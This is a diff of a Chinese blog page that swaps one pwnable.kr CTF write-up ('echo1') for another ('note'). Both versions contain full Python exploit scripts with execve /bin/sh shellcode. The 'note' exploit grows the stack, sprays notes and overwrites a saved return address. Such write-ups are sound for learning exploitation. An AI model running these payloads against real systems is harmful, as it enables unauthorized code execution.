@@ -84,19 +84,28 @@
 
 
 
-<meta name="description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
+<meta name="description" content="Conclusion
+select_menu()函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400
+exit服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了
+
+劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做auto">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-echo1">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo1/index.html">
+<meta property="og:title" content="pwnable.kr-rookiss-note">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/05/pwnable-rookiss-note/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
-<meta property="og:updated_time" content="2016-08-04T17:18:40.000Z">
+<meta property="og:description" content="Conclusion
+select_menu()函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400
+exit服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了
+
+劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做auto">
+<meta property="og:updated_time" content="2016-08-05T15:50:28.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-echo1">
-<meta name="twitter:description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
+<meta name="twitter:title" content="pwnable.kr-rookiss-note">
+<meta name="twitter:description" content="Conclusion
+select_menu()函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400
+exit服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了
+
+劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做auto">
 
 
 
@@ -117,9 +126,9 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo1/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/05/pwnable-rookiss-note/"/>
 
-  <title> pwnable.kr-rookiss-echo1 | Icemakr's Blog </title>
+  <title> pwnable.kr-rookiss-note | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -279,7 +288,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
             
             
               
-                pwnable.kr-rookiss-echo1
+                pwnable.kr-rookiss-note
               
             
           </h1>
@@ -291,8 +300,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
+            <time itemprop="dateCreated" datetime="2016-08-05T00:00:00+08:00" content="2016-08-05">
+              2016-08-05
             </time>
           </span>
 
@@ -321,8 +330,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-echo1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/25/pwnable-rookiss-echo1/" itemprop="commentsCount"></span>
+                <a href="/2016/08/05/pwnable-rookiss-note/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/05/pwnable-rookiss-note/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -345,8 +354,15 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
       
 
       
-        <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+        <h2 id="Conclusion">Conclusion</h2><ul>
+<li><code>select_menu()</code>函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400</li>
+<li><code>exit</code>服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了</li>
+</ul>
+<p>劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做<strong>automatic stack expansion</strong>)</p>
+<p>栈的最大扩充的大小可以通过<code>ulimit -s</code>，一般是0x800000bytes，但是如果扩充的太多的话，再执行后面的操作到时候就可能爆栈了，所以我们扩充个一半大小，类似二次函数的极点</p>
+<p>接着，我们只要不断的<code>create_note</code>&amp;&amp;<code>delete_note</code>，直到分配到了一个我们想要的位置（服务器没有开aslr），然后往里面写入shellcode所在的地址即可（<code>write_note</code>没有做长度检查，所以想写多少写多少，写个0x500字节就肯定能覆盖到某个$eip了） </p>
+<p>另外，忘记了这题是本地利用，用了zio写的，发现服务器上没有zio，不过有pwntools，不过还是贴了zio的exp版本上来</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./note'</span></span><br><span class="line">io      = zio(target, timeout = <span class="number">10000</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'I think security people will thank me for this :'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'5. exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'note created. no '</span>)</span><br><span class="line">    no = io.readline()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    io.read_until(<span class="string">'['</span>)</span><br><span class="line">    <span class="keyword">return</span> (int(no), int(io.read_until(<span class="string">']'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span><span class="params">(no, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'5. exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'note no?'</span>)</span><br><span class="line">    io.writeline(str(no))</span><br><span class="line">    io.read_until(<span class="string">'paste your note (MAX : 4096 byte)'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(no)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'5. exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'note no?'</span>)</span><br><span class="line">    io.writeline(str(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_ret</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'5. exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'5. exit'</span>)</span><br><span class="line">    io.writeline(str(<span class="number">0x31337</span>))</span><br><span class="line">    io.read_until(<span class="string">'this'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">mem = create_note()</span><br><span class="line"><span class="keyword">while</span> mem[<span class="number">1</span>] &gt; <span class="number">0xf0000000</span>:</span><br><span class="line">    delete_note(mem[<span class="number">0</span>])</span><br><span class="line">    mem = create_note()</span><br><span class="line">    <span class="keyword">print</span> hex(mem[<span class="number">1</span>])</span><br><span class="line">write_note(mem[<span class="number">0</span>], shellcode.rjust(<span class="number">0x100</span>, <span class="string">'\x90'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack grow</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>, <span class="number">0x1000</span>):</span><br><span class="line">    secret(<span class="string">'A'</span> * <span class="number">0x400</span>)</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">mem1 = create_note()</span><br><span class="line"><span class="keyword">while</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>) <span class="keyword">or</span> (mem[<span class="number">1</span>] &gt; <span class="number">0xffffd000</span>):</span><br><span class="line">    delete_note(mem1[<span class="number">0</span>])</span><br><span class="line">    mem1    = create_note()</span><br><span class="line">    note    = read_note(mem1[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] memory address: "</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] note: "</span> + note.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">if</span> (mem1[<span class="number">1</span>] &gt;= <span class="number">0xf7ffc000</span>) <span class="keyword">and</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>):</span><br><span class="line">        <span class="keyword">if</span> note != <span class="string">'\x0a'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload = l32(mem[<span class="number">1</span>]) * (<span class="number">0x1000</span>/<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n-------------find it-------------------'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] write to     :   '</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] with payload :   '</span> + payload</span><br><span class="line">write_note(mem1[<span class="number">0</span>], payload)</span><br><span class="line"></span><br><span class="line">exit_ret()</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -372,17 +388,13 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/25/pwnable-rookiss-echo2/" rel="next" title="pwnable.kr-rookiss-echo2">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-echo2
+              <a href="/2016/08/02/pwnable-rookiss-rsa-calculator/" rel="next" title="pwnable.kr-rookiss-rsa-calculator">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-rsa-calculator
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/26/pwnable-rookiss-fsb/" rel="prev" title="pwnable.kr-rookiss-fsb">
-                pwnable.kr-rookiss-fsb <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -507,7 +519,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
             
           </div>
         </section>
@@ -634,9 +646,9 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/25/pwnable-rookiss-echo1/';
-      var disqus_title = "pwnable.kr-rookiss-echo1";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo1/';
+      var disqus_identifier = '2016/08/05/pwnable-rookiss-note/';
+      var disqus_title = "pwnable.kr-rookiss-note";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/05/pwnable-rookiss-note/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
